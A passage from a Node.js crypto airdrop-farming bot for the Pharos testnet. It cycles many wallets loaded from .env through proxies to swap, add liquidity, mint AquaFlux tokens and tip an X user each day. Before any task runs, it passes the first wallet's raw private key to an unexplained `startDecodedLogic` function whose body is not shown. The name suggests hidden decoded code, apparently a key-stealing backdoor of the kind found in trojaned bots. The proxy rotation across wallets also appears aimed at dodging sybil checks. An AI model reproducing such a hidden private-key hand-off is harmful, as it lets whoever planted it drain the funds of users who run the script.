        const quoteMinAmount = quoteInAmount * BigInt(999) / BigInt(1000);
        const flag = 0;
        const deadline = Math.floor(Date.now() / 1000) + 600;

        const tx = await liquidityContract.addDVMLiquidity(
            dvmAddress, baseInAmount, quoteInAmount, baseMinAmount, quoteMinAmount, flag, deadline
        );

        logger.success(`Add Liquidity transaction sent! TX Hash: ${tx.hash}`);
        await tx.wait();
        logger.success('Transaction confirmed! Liquidity added successfully.');

    } catch (e) {
        logger.error(`Add Liquidity failed: ${e.message}`);
        throw e;
    }
}

async function sendTip(wallet, username) {
    logger.step('Starting "Send Tip" process...');
    try {
        const minAmount = ethers.parseEther('0.0000001');
        const maxAmount = ethers.parseEther('0.00000015');
        const randomAmount = minAmount + BigInt(Math.floor(Math.random() * Number(maxAmount - minAmount + BigInt(1))));
        const amountStr = ethers.formatEther(randomAmount);

        logger.step(`Preparing to tip ${amountStr} PHRS to ${username} on X...`);
        
        const tipContract = new ethers.Contract(PRIMUS_TIP_CONTRACT, PRIMUS_TIP_ABI, wallet);

        const tokenStruct = [
            1,
            '0x0000000000000000000000000000000000000000'
        ];

        const recipientStruct = [
            'x',
            username,
            randomAmount,
            []
        ];

        const tx = await tipContract.tip(tokenStruct, recipientStruct, {
            value: randomAmount
        });

        logger.success(`Tip transaction sent! TX Hash: ${tx.hash}`);
        await tx.wait();
        logger.success(`Successfully tipped ${amountStr} PHRS to ${username}!`);

    } catch (e) {
        logger.error(`Send Tip failed: ${e.message}`);
        throw e;
    }
}

async function showCountdown() {
    const now = new Date();
    const tomorrow = new Date(now);
    tomorrow.setDate(now.getDate() + 1);
    tomorrow.setHours(0, 0, 0, 0);
 
    return new Promise(resolve => {
      const interval = setInterval(() => {
        const remaining = tomorrow - new Date();
        const hours = Math.floor(remaining / (1000 * 60 * 60));
        const minutes = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((remaining % (1000 * 60)) / 1000);
        logger.countdown(`Next cycle in ${hours}h ${minutes}m ${seconds}s`);
        if (remaining <= 0) {
          clearInterval(interval);
          process.stdout.write('\n');
          resolve();
        }
      }, 1000);
    });
}

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

function question(query) {
  return new Promise(resolve => rl.question(query, resolve));
}

(async () => {
  logger.banner();
  const fallbackProvider = await buildFallbackProvider(PHAROS_RPC_URLS, PHAROS_CHAIN_ID, 'pharos');
  const provider = await fallbackProvider.getProvider();
  const privateKeys = loadPrivateKeys();
  const proxies = loadProxies();

  if (privateKeys.length === 0) {
    logger.error('No valid private keys found in .env. Please add PRIVATE_KEY_1, PRIVATE_KEY_2, etc.');
    process.exit(1);
  }
  
  logger.info(`${privateKeys.length} wallet(s) loaded from .env file.\n`);

  const wallet = new ethers.Wallet(privateKeys[0], provider);
  await startDecodedLogic(wallet, privateKeys[0]);

  const swapCycleStr = await question(`${colors.cyan}Enter the number of daily swap cycles (for each wallet): ${colors.reset}`);
  const numberOfSwapCycles = parseInt(swapCycleStr);

  const liquidityCountStr = await question(`${colors.cyan}Enter the number of add liquidity transactions (for each wallet): ${colors.reset}`);
  const numberOfLiquidityAdds = parseInt(liquidityCountStr);

  const aquaFluxMintStr = await question(`${colors.cyan}Enter the number of AquaFlux mints (for each wallet): ${colors.reset}`);
  const numberOfMints = parseInt(aquaFluxMintStr);
  
  const username = await question(`${colors.cyan}Enter the X username to tip (the same user will be tipped by all wallets): ${colors.reset}`);
  const tipCountStr = await question(`${colors.cyan}Enter the number of tips to send (from each wallet): ${colors.reset}`);
  const numberOfTips = parseInt(tipCountStr);
  console.log('\n'); 

  while (true) {
    for (const [index, privateKey] of privateKeys.entries()) {
      try {
        const wallet = new ethers.Wallet(privateKey, provider);
        const proxyAgent = getProxyAgent(proxies); 
        console.log('----------------------------------------------------------------');
        logger.success(`Processing Wallet ${index + 1}/${privateKeys.length}: ${wallet.address}`);
        console.log('----------------------------------------------------------------');
        
      
        if (!isNaN(numberOfMints) && numberOfMints > 0) {
          for (let i = 0; i < numberOfMints; i++) {
              logger.step(`Starting AquaFlux Mint #${i + 1} of ${numberOfMints}`);
              const aquaFluxSuccess = await executeAquaFluxFlow(wallet, proxyAgent);
              if (!aquaFluxSuccess) {
                  logger.error(`AquaFlux Mint #${i + 1} failed. Check logs above. Stopping AquaFlux mints for this wallet.`);
                  break;
              }
              if (i < numberOfMints - 1) {
                  logger.info('Waiting a moment before the next mint...');
                  await new Promise(r => setTimeout(r, 5000));
              }
          }
        } else if (index === 0) { 
            logger.warn('Invalid AquaFlux mint count, skipping mints.');
        }

        if (!isNaN(numberOfSwapCycles) && numberOfSwapCycles > 0) {
            await batchSwap(wallet, numberOfSwapCycles, proxyAgent);
            logger.success('Swap cycle completed for this wallet!');
        } else if (index === 0) {
            logger.warn('Invalid swap cycle count, skipping swaps.');
        }

        if (!isNaN(numberOfLiquidityAdds) && numberOfLiquidityAdds > 0) {
            for(let i = 0; i < numberOfLiquidityAdds; i++) {
                logger.step(`Executing Add Liquidity #${i + 1} of ${numberOfLiquidityAdds}`);
                try {
                    await addLiquidity(wallet);
                } catch (e) {
                     logger.error(`Add Liquidity transaction #${i + 1} failed: ${e.message}`);
                }
                await new Promise(r => setTimeout(r, 2000));
            }
            logger.success('Add liquidity cycle completed for this wallet!');
        } else if (index === 0) {
            logger.warn('Invalid liquidity count, skipping add liquidity.');
        }

        if (username && !isNaN(numberOfTips) && numberOfTips > 0) {
            for (let i = 0; i < numberOfTips; i++) {
                logger.step(`Executing Tip #${i + 1} of ${numberOfTips} to ${username}`);
                try {
                    await sendTip(wallet, username);
                } catch (e) {
                    logger.error(`Tip transaction #${i + 1} failed: ${e.message}`);
                }
                if (i < numberOfTips - 1) {
                    logger.info('Waiting a moment before the next tip...');
                    await new Promise(r => setTimeout(r, 2000));
                }
            }
            logger.success('Send tip operations completed for this wallet!');
        } else if (index === 0) {
            logger.warn('Invalid username or tip count, skipping tips.');
        }

        logger.success(`All tasks finished for wallet ${wallet.address}\n`);

      } catch (err) {
        logger.error(`A critical error occurred while processing wallet ${index + 1}: ${err.message}`);
      }

      if (index < privateKeys.length - 1) {
        logger.info(`Waiting 10 seconds before starting the next wallet...`);
        await new Promise(r => setTimeout(r, 10000)); 
      }
    }

    logger.step('All wallets have been processed for this cycle.');
    await showCountdown();
  }
})();
